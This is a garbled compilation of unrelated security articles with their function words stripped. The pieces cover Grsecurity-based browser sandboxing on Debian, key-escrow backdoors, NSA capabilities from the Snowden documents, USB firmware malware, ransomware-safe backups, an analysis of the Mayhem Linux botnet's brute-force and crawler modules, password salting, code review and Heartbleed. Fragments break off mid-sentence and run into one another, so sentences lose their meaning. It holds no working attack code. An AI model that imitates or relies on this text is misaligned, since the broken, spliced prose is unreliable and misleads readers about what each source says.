Debian Grsecurity guide explains build custom live system images security sandboxing using tools Debian Live Systems project Grsecurity concreteness focus building custom live image sandboxing Firefox web browser also known Iceweasel Debian world However tools procedures allow build kind Debian-based live image want Motivation Prerequisites Limitations Alternatives Architecture Layer 1 Host System Layer 2 Guest Image Layer 3 Firejail Layer 4 Firefox Iceweasel Customization Motivation browser problem you're alive technically aware 2015 know Internet operating system applications software security disaster areas End-user systems workstations laptops especially hard protect growing tide malware delivered via Internet basic security measures taken disabling unnecessary operating system services firewalling network access largest attack surface typical end-user system today web browser Popular browsers large complex pieces software invariably written unsafe languages performance although may slowly changing Critical vulnerabilities discovered popular browsers every month one allow remote attacker take complete control computer running browser problem well known recognized browser vendors efforts made improve status quo building secure browser turned long difficult road Meanwhile users left adrift vulnerable even technically skilled good options securing web browser installations Live images live image complete operating system image file usually ISO format loaded system boot time CD DVD USB media runs completely RAM hard disk form persistent media required Changes made normally running system changes lost system powered reset live images support optional persistence partition allows user store data persists across restarts Live images powerful tool sandboxing Even live operating system applications compromised runtime next reboot restore system original clean state Simply using live system guarantee security make long-term compromise system significantly difficult especially combined countermeasures part top-to-bottom architecture takes account layer lowest physical setting highest user applications Prerequisites guide assumes experienced systems administrator comfortable Debian configuring building Linux kernel Limitations Alternatives live image method relatively heavyweight approach browser security Configuring building custom live image takes time skill using one harder using browser directly browser customization must done part live system configuration means making even simple persistent changes browser requires updating live configuration rebuilding live image work users willing put alternatives Use pre-built live system obviates need configure build live image ideal find image trust closely matches needs Unfortunately images seem available today built security mind exception Tails may suitable unless want route data Tor Use chroot jail Setting secure chroot environment difficult task attempted fully aware security weaknesses vanilla chroot environments employ kernel hardening measures guard chroot restrictions available Grsecurity kernels chroot jail provides relatively thin barrier guest host environments provide clean boot property live image Use namespace cgroups jail Newer Linux kernels provide range features used create container jail environments chroot environments difficult configure securely although tools Firejail make easier chroot jails programs running namespace jail still make system calls directly host kernel thus position exploit kernel-level security flaws Use kernel security framework like AppArmor SELinux Grsecurity RBAC restrict areas system application access frameworks serve mainly prevent compromised program affecting rest system best used along exploit prevention sandboxing measures Architecture guide assume four-layer architecture comprises host system workstation laptop guest live system running virtual machine host system container jail

machines virtual machine never secure host it's running Even guest operating system applications completely secure lost host compromised purpose building live image sandbox protect host guest applications way protect guest host Running applications like web browsers within virtual machine provides relatively high degree isolation host application compromised attacker may gain control guest system attacking host guest difficult task long basic host security precautions taken Although guest-to-host exploits attack hypervisor interface possible hypervisor flaws rare compared browser flaws hypervisor attack surface much smaller risk mitigated kernel hardening host guest systems using kernel security framework host restrict access hypervisor processes architecture described guide example

building running live image assume host Linux system KVM used run live image Step 1 1 Configure PaX Grsecurity step optional recommended Running Linux kernel patched PaX Grsecurity host provides significantly better security baseline vanilla Linux Grsecurity RBAC system also provides way restrict access privileges hypervisor QEMU KVM processes programs running host Setting Grsecurity requires downloading Linux kernel source applying Grsecurity patch matches kernel version configuring kernel including PaX Grsecurity parameters building kernel finally installing booting Assuming downloaded kernel source file name like linux-x y z tar xz corresponding Grsecurity patch grsecurity patch actual patch filename contains version date information basic steps tar axf linux-x y z tar xz cd linux-x y z patch -p1 grsecurity patch make nconfig edit save kernel configuration make deb-pkg goes well produce linux-image Debian package file along related package files kernel headers firmware

Custom Build Hooks Executable scripts placed config hooks directory filenames end hook chroot scripts run inside chroot end build process used make changes live system frozen final image example mechanism used set root password Create executable file called config hooks 0500-root-password hook chroot containing bin sh usermod -p ' 5 GxpbCxvGOmtudd uL90C ZOMY6WxI4 x32kTCv38dGiXYUlfWGzCQuHmr3'

preventing access user's real home directory good way start 'known clean' browser instance Restricting Filesystem Access Firejail uses blacklist method restricting access parts filesystem achieves remounting system directories like etc lib usr read-only within container default fully blocking access files directories mounting empty tmpfs filesystem top Seccomp filtering prevents mounts changed within container calls mount 2 One omission defaults leave dev directory accessible fixed example creating file called etc firejail blacklist-dev inc contents like seccomp mknod blacklist dev autofs

sharing systems varied whether implemented hardware software level assurance read-only vs read-write access Yet many designed evaluated high standards assurance eg Orange Book A1 FIPS Level 4 NSA Type 1 professional security evaluators decided unlikely breached production Unfortunately new knowledge emerged time showing weaknesses technology side-effect field new diverse constantly-evolving failures crypto protocols OS's due really understanding problem knowing fundamentals solving strong building blocks hand time wheat filtered chaff building blocks fundamental principles use ways allow strong security arguments Security schemes leveraged simplest strongest without risky often new constructions best Fundamentals POLA integrity protection small TCB's layering interface protection would've prevented contained almost remote attacks led mantra tried true novel new techniques used high assurance security engineering real trick define decompose problem simple functions leveraging well-understood building blocks straight-forward interactions eg EAL6-7 design style craziness debate easier spot substitute L backdoor Remote Administration Tool RAT see religion situation looking response two terms Claiming restricted access trusted personnel hardened SSH setup leads INFOSEC accept claim noting problems might show protocol implementation keep monitoring unusual activity system patches problems Alternatively claiming built L selective access leads many INFOSEC pro's start claiming let everyone that's absolutely unacceptable despite fact thing difference lack control sees information it's shared That's unrelated security RAT mechanism L RAT Let's keep simple escrow third party encrypted messages rather full-access system scheme requires strong method encrypting messages best combination solid RNG asymmetric encryption keys symmetric encryption data normal use application inputs configuration keys data black box black box outputs configuration results ciphertext error messages Highly assured implementations state-machine interacting state machines limited number finite steps Escrow adds identical black box different public key accepts identical key input produces ciphertext output point user's security maintained cryptosystem escrow's Another issue ensuring right key used updated may done manual entry user test message TPM-style signed program monitoring encryption sessions vs escrows received variety methods require nothing host would already protect ways well-studied Alternatively remote update feature might implemented constrained process runs daily check new escrow key download untrusted data check signature make sure looks like key 500KB code etc write mutually trusted program escrow key storage we're using new key low risk interaction anything else basic secure update procedure type I've implemented custom symmetric GPG-style functionality others done countless variations Nothing special simple amenable high assurance implementation Next protecting escrowed keys hardest part requirements run gamut security given high stakes High Strength Attackers involved need combination strong physical security vetted personnel check others' work anti-hardware subversion approaches eg diversity high assurance guards high assurance interface software manual review steps HSM's keys EMSEC safe least solid recovery mechanisms lifecycle processes ensure security policy keys operation followed Good news components many highly assured ones NSA EKMS system many components describe I'd figure they'd panic visible way eg suspending long time evidence mass compromise Seems good far aspects secure RAT aka backdoor seem achievable robust way failures others cited systems properties low assurance design TCB attackers unrestricted physical access admins weren't trustworthy actions audited backdoor common software vulnerability inserted deliberately result non-rigorous development words opposite would build high security RAT led security breaches think failure low security methods achieve security way proves high security methods can't get job done high security methods work well still work many similar ways evidence escrow built least high security level non-escrowed methods manageable risk key-holders Whether different debate Naturally I'm side pervasive security without RAT's everything Yet concerns law enforcement intelligence agencies often lead laws mandating remote access kind Individuals businesses also depend secure RAT's eg administration escrow eg compliance current probably future needs

decrypting certain types traffic including Truecrypt PGP GPG Tor ZRTP implementations RedPhone Since protocols share many underlying cryptographic algorithms RSA Diffie-Hellman ECDH AES presenting evidence primitives cryptographically strong AES note good news also taken grain salt small number exceptions seems increasingly obvious Snowden documents geared towards NSA analysts operations staff fact many systems actually seem aimed protecting knowledge NSA's cryptanalytic capabilities NSA's operational staff Five Eyes partners analyst it's quite possible you'll never learn given intercept successfully decrypted put bit succinctly lack cryptanalytic red meat documents may truly representative NSA capabilities may simply artifact Edward Snowden's clearances time left NSA Tor One surprising aspects Snowden documents us security research community anyway NSA relative ineptitude comes de-anonymizing users Tor anonymous communications network reason surprise twofold First Tor never really designed stand global passive adversary attacker taps huge number communications links one thing ve learned Snowden leaks NSA plus GCHQ definition term theory least Tor relatively easy target agency real surprise though despite huge signals intelligence advantage NSA barely even tested ability de-anonymize users fact leak provides first concrete evidence NSA experimenting traffic confirmation attacks find source Tor connections Even surprising techniques relatively naive even compared going research community doesn mean view Tor secure NSA seems obvious agency identified Tor high-profile target know resources make much headway network real surprise haven tried harder Maybe they're trying SSL TLS IPSEC months ago wrote long post speculating NSA breaks SSL TLS increasingly clear NSA break protocols relatively large scale new documents tell us much didn already know confirm basic outlines attack first portion requires endpoints around world capable performing raw decryption SSL TLS sessions provided know session keys second separate infrastructure located US soil recover session keys needed real magic happens within key recovery infrastructure documents provide first evidence major attack strategy NSA GCHQ involves key databases containing private keys major sites RSA key exchange ciphersuites TLS single private key sufficient recover vast amounts session traffic real time even fact interesting question NSA gets private keys easiest answer may least technical different Snowden leak shows gives reason believe NSA may relationships employees specific named U entities may even operate personnel cover would certainly one way build key database even without James Bond aspect every reason believe NSA means exfiltrate RSA keys operators period question know least one vulnerability Heartbleed could used extract private keys software TLS implementations still unreported vulnerabilities could used today Pretty much everything said SSL TLS also applies VPN protocols additional detail many VPNs use broken protocols relatively poorly-secured pre-shared secrets cases brute-forced NSA seems positively gleeful Open Source packages Redphone Truecrypt PGP OTR documents provide least circumstantial evidence open source encryption technologies may thwart NSA surveillance include Truecrypt ZRTP implementations RedPhone PGP implementations Record messaging packages commonalities re open source relatively well studied researchers re used terribly wide scale compared e g SSL VPNs work end-to-end basis involve service providers software

keeping wraps 'activist nonsense' story others skates close line think it's worth talking information important sum complicated issue live world targeted surveillance probably necessary inevitable evidence far indicates NSA good kind work despite notable failures actually executing intelligence produces Unfortunately documents released far also show great deal NSA GCHQ surveillance targeted Vast amounts data scooped indiscriminately hope someday prove useful Worse NSA decided bulk surveillance justifies efforts undermine many security technologies protect information systems President's

talk PC connected problems arise firmware USB peripheral changed malicious major platforms Windows Mac OS X Linux affected since problems USB devices platforms connected antimalware perspective problem arises firmware USB peripheral overwritten new firmware actors manufacturer without user making physical change device eg flip physical switch device Unfortunately researchers showed many common USB thumb drives software machine connected USB thumb drive rewrite firmware code manufacturer without physical changes essence means malware rewrite USB thumb drive firmware Ok know malware rewrite USB thumb drive firmware probably devices well problem Yes I'll explain end blog isn't immediate problem home users yet enterprise users mitigate risk Malware overwrite firmware act maliciously infect machines connected Although malware overwrite firmware USB peripherals firmware often specific manufacturer model malware spread worm using multiple models USB peripherals would take significant resource investment reason don't believe effective malware worm spreading using approach shortly researchers proposed several ways malicious firmware propagate like worm upon overwriting firmware USB peripheral eg USB thumb drive change device type time become keyboard allows firmware send series particularly crafter keystrokes quickly download install virus computer connected demonstration takes almost two seconds carry would clearly visible PC's user something occurred requires user logged PC time attack PC's boot-up USB thumb drive recognize change bootable device take machine requires USB device higher boot order regular hard drive default many PCs USB keyboard emulated boot change boot order process highly dependent make model machine reasons method appear big risk Content thumb drive controlled access time example device distinguish two types access thumb drive could provide good content antimalware software scanned provide malicious content opened user exposes large driver attack surface exploiting since USB device choose interface many different drivers future could infect machines they're plugged network connection modified

ability protect malware running computer infection malicious USB peripheral like malware propagation presenters pointed solution USB peripherals problem lies primarily device manufacturers manufacturers make USB devices secure default either accepting digitally signed firmware updates manufacturer accepting firmware updates requiring physical modification change firmware example could physical switch USB thumb drive enable rewriting firmware accepting firmware updates defenses would largely prevent worm-like propagation firmware-rewriting malware USB peripherals encourage anyone interested watch presentation details Implications home users Don't go throwing USB thumb drives peripherals yet start seeing malware actively using techniques home users little afraid hope awareness created around issue help drive device manufacturers release firmware updates problematic USB peripherals longer accept firmware updates signed disable firmware updates entirely USB peripherals may discarded future become targeted manufacturer update made available Implications enterprise users enterprise users require USB thumb drives look upgrading USB model non-writable firmware models require digitally signed firmware updates Mass storage devices one important USB peripherals secure given often plugged multiple machines lifetime Employees careful connecting phones enterprise computers USB eg charge Connecting enterprise phones personal computers avoided reduce risk infection Smartphones running outdated operating systems may particularly susceptible infection could carry-out USB attacks computers connected Enterprises highly sensitive data may need evaluate firmware update process peripheral devices currently use purchasing Depending type data held corporation country manufacture well distribution path devices may need considered Enterprise security software needs start investing protecting computers USB peripherals software solution may able resist USB peripheral changing device types example detect sequences keystrokes deemed malicious quick human-controlled Similarly hardware security USB hubs may built enforce device types USB ports prevent firmware rewriting analogous traditional network firewall USB port device plugged could define device types allowed USB peripheral Although defeats design advantage USB partially mitigates risk

data Congratulations backing PC aren safe may think Files backup drive vulnerable disaster files main system recently CryptoLocker demonstrated external drive connected PC secondary hard drive example external USB hard drive used backup could fall victim ransomware easily PC end cable lot people got burned CryptoLocker attached backup drives also encrypted Trojan says Dwayne Melancon CTO enterprise security company Tripwire CryptoLocker encrypts local data files also looks attached storage devices network shares storage locations connected computer let CryptoLocker-style catastrophe happen options protecting backup drive attacks Disconnect backup data Marc Maiffret CTO security software firm BeyondTrust sums common-sense solution Make sure back media removed physically system stored offline approach less convenient course good habit form couple reasons First moves backup data harm way ransomware ever infects PC Second store backup media fire safe better still offsite safety deposit box backup may survive even natural unnatural physical disaster destroys original data Backing data recordable CDs DVDs keep backup safe malware though may force use many discs One option back data less-volatile media recordable CDs DVDs recording session finalized data safe malware threats even disc remains drive downside using optical discs media much smaller storage capacity compared modern hard drives meaning performing full backup may require multiple discs Back cloud Rather backing locally consider using cloud Cloud backup applications generally run background service system doesn view attached networked drive result malware threats unlikely spread directly cloud backup modern backup systems use proprietary storage format protection makes backed-up files unable read written common malware says Paul Lipman CEO Total Defense sells online backup services well antivirus security software doesn mean impossible highly unlikely Malware generally works attaching existing files system cases proprietary storage formats malware would able infect backup directly Using cloud backup service like Backblaze improves security data Note however cloud backup services automatically sync update data local PC compromised ll want disable service prevent compromised data overwriting good backup data Back multiple versions effective way safeguard backup maintain one copy data two ways First security experts recommend backing important data one location example back external USB drive disconnect use also use cloud backup service way infection physical disaster compromises either backup ll still good copy data Redundancy strongest protection backed data Crashplan makes easy back multiple locations second way maintain version histories files Save multiple backups different points time choose cloud backup service stores recent backup restore data time compromise occurred go step also create several generations local off-site image backups computer

David McKinney lead developer Subgraph also features new email client written scratch email client also compatible PGP popular encryption software used journalists privacy enthusiasts alike important

Yandex OverviewInfection server Mayhem begins PHP dropper script script responsible dropping malicious ELF shared object file executing dropped binary usually named libworker research also uncovered cases binary called atom-aggregator rss-aggr dropper script always includes 32-bit 64-bit version malware identical functionality configuration dropper script first kills running usr bin host

executable usr bin host executed OS loader loads malicious binary allowing hook exit -function eventually get called usr bin host usr bin host calls exit execution gets passed malicious binary research far uncovered 47 unique Mayhem samples earliest samples least half year old newest possibly less week old analysing samples clear Mayhem gone three major iterations development iteration made malware increasingly complex advanced addition smaller incremental updates observed shows Mayhem family malware active development rest post focus latest feature-rich iteration Mayhem Mayhem malware designed highly modular consists main component multiple optionally loaded modules main component responsible communicating C C well loading unloading executing modules malware also uses hidden encrypted filesystem store modules well files used modules filesystem stored disk file whose name specified part malware's configuration data cases file named sd0 However recently observed malware author switching naming file caches possibly response name hidden filesystem file published multiple sources used search infected systems clear malware active development noted size hidden filesystem file also specified malware configuration data exactly 12MB cases observed Mayhem malware communicates C C server using specially crafted HTTP post -requests headers requests highly distinctive contain 3 specific fields 'Host' 'Pragma' 'Content-Length' -fields value 'Pragma' -field always '1337' Additionally HTTP version always specified 1 0 example request malware C C server seen seen actual body request consists one lines specifying commands messages lines always begin single character specifying message type followed comma-delimited list parameters supported message types enable

start new job result main component creating operator-specified number threads executing functionality loaded module Finally C C server begin sending argument strings malware module process contents argument strings depend loaded module usually contain least target domain URL malicious activity ModulesDuring research encountered wild 11 different modules used Mayhem malware observed multiple distinct versions clearly shows also modules active development modules encountered bruteforce - used brute force login credentials WordPress Joomla sitesbruteforceng - HTTPS regex support higher

individually cover interesting findings bruteforce soThe bruteforce -module far common module active use right later quite simple functionality takes target url pointing login page WordPress Joomla site file listing usernames file listing passwords tries log every possible username password combination bruteforceng soThis module advanced version bruteforce -module added support HTTPS regular expressions addition taking input target url file usernames file passwords module also requires rule file rule file used specify login interface targets Therefore module used brute force login credentials web-based interface observed module used mainly brute force login credentials WordPress Joomla sites However reason believe also used kinds sites example cPanel Web Host Manager sites interesting note recently uncovered new versions bruteforce bruteforceng modules Whereas old versions tried usernames username -file targets new versions allow C C specify single username use command string used C C specify target urls Q target 'target' url Commands new versions however support longer command string Q target username Note addition semi-colon another parameter additional parameter specify single username combined passwords password file however username string 'no_matches' second parameter specified module falls back old method trying every username separate username file crawlerng crawlerng -module used crawl websites takes argument file containing regular expressions searches target domains content matching regular expressions seems mainly used identifying login pages WordPress Joomla sites However due rules regular expressions module instructed identify essentially kinds pages example also observed crawlerng -module used identify PhpMyAdmin DirectAdmin Drupal login pages cases module used find websites featuring content matching specific keywords instance pharmacy -related keywords one case even observed malware operator getting creative using crawlerng -module look local file inclusion -vulnerabilities rulesets observed also instructed module search links leading HTTP- HTTPS- FTP-sites way module keeps finding new targets crawl rules used look LFI vulnerabilities opendns soThis module used search open recursive DNS resolvers could used DNS amplification attacks module takes argument IP address range threshold size iterates IPs range attempting connect port 53 one successfully connects port 53 next sends DNS request asking records domain 'ripe net' recursive extended DNS 'DNSSEC OK' -bits set target running open recursive DNS resolver reply large DNS answer size reply compared previously set threshold size larger IP address reported back C C Packet capture DNS request sent module heartbleed module tries identify whether

uncovered 19 C C domains used Mayhem malware family 7 currently active current activity related brute forcing WordPress Joomla login credentials However also observed brute forcing FTP login credentials well crawling domains search WordPress Joomla login pages also evidence modules used wild one time another observations brute forcing activity seems highly opportunistic malware operator seem focus volume rely enough sites using common weak credentials week logging target urls active C C servers identified 350 000 unique targets single C C server responsible 210 000 unique targets noted targets given single instances malware total volume probably much larger Based analysis target domains don't believe malware operator targeting anyone anything specifically Rather believe simply searching web's low hanging fruit supported geographic distribution target domains seen absence China top 10 notable believe anomaly rather intentional choice part malware operator ConclusionsWe believe malware operator use Mayhem primarily reconnaisance tool gain access easily compromised servers later used base sophisticated attacks example operator might first use crawlerng -module find

Storage MistakesI visiting web site recently haven't visited many many years tried old passwords used use started using password storage system luck defeated Barred entry site wait Forgot Password link knowing soon entry site confidently click link entering believe username Boom seconds later email web site name Opening email password created ages ago Head-slap head slap wasn't forgetting password developers site storing PASSWORD clear text anyone access database could readily read password along w thousands users incensed wait know storing passwords clear text database big mistake isn't possible password wasn't stored clear text rather application stores password encrypted form decrypts prior sending email unjustifiably harsh Storing password using reversible encryption means password may decrypted Someone access application's system key may also readily access password thousands users site One compromise key passwords toast HashingSo don't like clear text storage passwords don't like passwords stored encrypted form like Well want see password hashed message digest extra steps dive later first let's review message digest Hashing results message digest one-way operation hash calculated input provided result fixed length output SHA-512 algorithm 64 byte output SHA-256 algorithm fixed 32 byte output bcrypt algorithm fixed 60 byte output algorithms infinite number potential inputs algorithm finite number potential outputs algorithm one input creates output happens called collision collisions can't map infinite input space onto finite output space without collisions Good cryptographic algorithms make difficult find collisions especially meaningful ones Moving forward let's assume we're using good cryptographically strong algorithms make extremely hard find collisions hashing password we've solved password storage problem first setup password application hashes password stores message digest subsequently login application hashes clear-text password entered compares message digest previously stored match passwords we're using good cryptographically strong algorithm makes hard find collisions know hashing irreversible means even people access database cannot get password Problem solved we're quick problem isn't yet solved people crack passwords Unfortunately hashing irreversible passwords hashed still cracked number password cracking methods used including password dictionaries rainbow tables brute force password dictionary Webster's unabridged dictionary Webster's unabridged dictionary every conceivable language steroids misspellings words numbers added throughout words capital variations lower case variations mixed case variations huge rainbow table table contains pre-computed hash values passwords password dictionary password attack looking hash value rainbow table much faster hashing comparing value password dictionary details rainbow tables work scope blog know good rainbow table take lot space disk readily crack passwords people use SaltingSo hashing useless store passwords need little something special make better little salt trick Well actually big complex salt better Suppose following password 123456 would trivially easy crack dictionary attack rainbow table could used find password suppose developers hash password append large random character string aka salt rather calculating hash 123456 H 123456 instead store following large random character string salt along password say 4zLrfqPz AYrkesHvKb6u create password application code creates salt stores calculates hash password concatenated generated salt H password salt case H 12345644z LrfqPzAYrkesHvKb6u application developers decided use salts hashing effectively made trivially simple password much complex made unlikely someone could crack password pre-computed dictionary attack use pre-computed rainbow table Rather sufficiently large random salt attacker must create separate dictionary rainbow table user's password trying crack extraordinarily expensive strong salts effectively break dictionary attacks rainbow tables seem odd salts secret stored right along message digest use salt makes cracker's job much difficult Rather able use one dictionary attack one rainbow table try crack every unsalted password stored need create one rainbow table dictionary every password message digest dictionary attack want crack 123456 password would need concatenate salt order crack password next user different salt forces attacker recalculate hash using new salt makes attacker's job harder slows password cracking attack someone really wants break account salt create rainbow table crack password could conduct brute force attack brute force attack one determines password space tries every potential password password space application allows users 1 digit password password space 10 potential passwords 0 1 2 3 4 5 6 7 8 9 one character password 10 possible characters 101 possible passwords allow 2 digit passwords 102 100 possible passwords potential password space 0 1 2 3 4 97 98 99 introducing complexity passwords say mixed case alphanumeric 10 characters long number potential passwords password space becomes 6210 26 lower case 26 upper case 10 digits 10 characters 8 4 x 1017 840 000 000 000 000 000 Brute force attacks complex passwords difficult simpler password requirements limit password space brute force attacks readily done especially serializing Graphics Processing Units GPUs together perform heavy computational load quickly cannot enforce complex passwords else application developer protect brute force attacks Work FactorWe slow certain extent Suppose fictional website myApplication com authenticate user 0 5 seconds end-to-end end user perspective Suppose users don't

step perform scan code find initial set security issues discover hot spots additional security issues likely discovered later steps may need perform following two types scans Automatic scan Manual scan combine scans perform one depending time limits review objectives Automatic Scan purpose automatic scan find security issues could missed manual review However automatic scan result large number false positives find every security issue might find manual review use static analysis tool perform automatic scan code Use static analyzer find first set security issues improve understanding issues likely discovered manually Theoretically anything static analysis tool finds found manual review well However static analysis tools unique test code without knowing requiring external states set static analyzer tool know application function intended make assumptions developer code reviewer might make Static analyzers tend good finding careless code practices missing error handlers empty catch blocks integer overflows scoping problems access static analysis tool perform text searches code base example using Findstr command-line tool Note Security issues tend cluster scan finds large number security issues particular component function carefully examine area discover security issues may missed first pass Managed Code Considerations Managed code takes care many security issues scanners good finding native code could scan reasonably accurately buffer overruns format string problems use potentially dangerous Win32 APIs memory leaks managed code eliminates types security issues still numerous problems occur scoping problems integer overflows lack cloning exception handling data truncation lack null checks unchecked values used memory allocation buffer access Limitations Automatic Scan expect automatic scan locate surface errors automatic scanning supplement manual review cannot replace Even best scanners contextual problems good finding security issues caused single lines code reasonable finding security issues span multiple lines code single function generally bad finding security issues whose scope spans multiple functions False Positives False Negatives Due programmatically rigorous nature static analysis scan may find problems manual review miss However analysis tools frequently find false positives frustrating gain better understanding

ThisBy 'memory locks' Jayson means mlock Unfortunately really enough mlock sure detecting page still locked hard Neither munlock mlock error asked act already-locked page way see still locked anything still locked even paged consult things proc pid -- access could reseed conventionally don't see could make work Comment 23645 Posted 2014-07-16 00 50 40 UTC Reader Nix Reply ThisI feeling mlock couldn't think good way check page locked OpenBSD provides really nifty way detect forks use minherit syscall INHERIT_ZERO argument specify page replaced zeros forking experience real eye opener operating system make easier write secure crypto library Comment 23646 Posted 2014-07-16 01 23 29 UTC Andrew Ayer Reply ThisA library RNG probably accept place universe thing get forked rather trying second guess system instead either mix new entropy every call direct programmer use effective resources operating system RNG service instruction set RNG etc don't think linkable library really right place RNG It's fine providing conservative way access system entropy fine operating isolation CSPRNG Comment 23654 Posted 2014-07-16 22 48 06 UTC Reader David Johnston Reply Thispid_t 16-bits though often default proc sys kernel pid_max set value fits unsigned 16-bit number likely keep ancient programs working value raised little 4 million systems influence number raised otherwise busy systems run id's limit set much higher chance pid reuse lessened eliminated Comment 23636 Posted 2014-07-15 23 00 03 UTC Reader Kenny Reply ThisYou're correct - thanks clarification Point still stands PIDs reused default it's effectively 16 bits Comment 23640 Posted 2014-07-16 00 14 25 UTC Andrew Ayer Reply ThisMy pid_mad 32768 effectively 15 bits Comment 23660 Posted 2014-07-17 08 17 40 UTC Reader Olivier Mengu Reply ThisThis response one OpenBSD developers twitter Miod Middle MiodVallat 4hPeople complaining LibreSSL PRNG ought get OS fixed provide decent entropy source instead Must tall ride'Comment 23638 Posted 2014-07-15 23 43 26 UTC Reader Joe Reply ThisAs said article mess evidence design flaw Linux kind agree LibreSSL devs want provide portable version LibreSSL need provide facilities make safe OpenSSL Comment 23641 Posted 2014-07-16 00 15 57 UTC Andrew Ayer Reply better OpenSSL killing process instead returning easily-ignored error code Hello Seriously Please 1980s anymore Killing process error major PITA anyone writing library code bindings higher-level languages usually proper exception propagation mechanism meaning can't ignore error return mistake know Frankly anyone thinks killing process legitimate response non-catastrophic failures banned writing anything else throwaway scripts enterprise frameworks Comment 23642 Posted 2014-07-16 00 18 00 UTC Reader Antoine Reply ThisFrom selfish perspective completely agree since I'm C programmer wrap calls RAND_bytes function checks return value throws exception fails don't want programs raising SIGKILL error However I'm aware cryptographic libraries used practice since OpenSSL LibreSSl C library it's likely programmers going ignore return value RAND_bytes Fortunately missing dev urandom pretty exceptional error raising SIGKILL unreasonable Comment 23643 Posted 2014-07-16 00 25 43 UTC Andrew Ayer Reply Thisit's missing dev urandom also resource exhaustion example out-of-fd's cause open dev urandom fail attacker may find ways make application run fds example creating many connections aborting program library however bad precludes usage said library robust application rather return error code getentropy fails library user handle error gracefully doesn't check return value it's neither library's fault responsibility abort kill acceptable API misdesigned way prevents checking error Comment 23650 Posted 2014-07-16 13 50 36 UTC Reader John Spencer Reply ThisSome excellent catches removal rather conversion noop RAND_poll especially bizarre LibreSSL folks disservice integrity project attempting downplay issues you've exposed Comment 23653 Posted 2014-07-16 21 05 02 UTC Reader Jacques Reply ThisIf application knows going chroot it's child away accessing dev urandom doesn't parent take responsibility provide named pipe chroot environment Part problem also seems drop-in replacement OpenSSL requires leaving API way Hopefully LibreSSL gain popularity able revise API include things able specify entropy quality calling app decides scary function acceptable source entropy Comment 23658 Posted 2014-07-17 04 40 40 UTC Anonymous Reply ThisYes part problem one hand LibreSSL developers trying make LibreSSL drop-in replacement OpenSSL hand want ignore parts API don't like problem even right API parts bad Still even LibreSSL designed scratch I'd still want provide way open dev urandom advance long-standing privilege separation idiom start execution outside chroot open needed resources chroot completely empty directory shouldn't change way chroot jails LibreSSL refuses provide API make possible Even libsodium modern crypto library frequently lauded good design provides API open dev urandom advance Fortunately LibreSSL's API deficiency easily worked around asking 1

Apr 2014 Nick Sullivan Tweet Update thought 12 27pm UTC verify belief crowd sourced investigation turns wrong takes effort possible extract private SSL keys challenge solved Software Engineer Fedor Indutny Ilkka Mattila NCSC-FI roughly 9 hours challenge first published Fedor sent 2 5 million requests course day Ilkka sent around 100K requests recommendation based finding everyone reissue revoke private keys CloudFlare accelerated effort behalf customers whose SSL keys manage read widely-used open source library OpenSSL revealed Monday major bug known heartbleed sending specially crafted packet vulnerable server running unpatched version OpenSSL attacker get 64kB server working memory result classic implementation bug known Buffer over-read speculation vulnerability could expose server certificate private keys making sites vulnerable impersonation would disaster scenario requiring virtually every service reissue revoke SSL certificates Note simply reissuing certificates enough must revoke well Unfortunately certificate revocation process far perfect never built revocation mass scale every site revoked certificates would impose significant burden performance penalty Internet CloudFlare scale reissuance revocation process could break CA infrastructure ve spent significant amount time talking CA partners order ensure safely successfully revoke reissue customers' certificates vulnerability seems likely put private key data risk date verified reports actual private keys exposed CloudFlare received early warning Heartbleed vulnerability patched systems 12 days
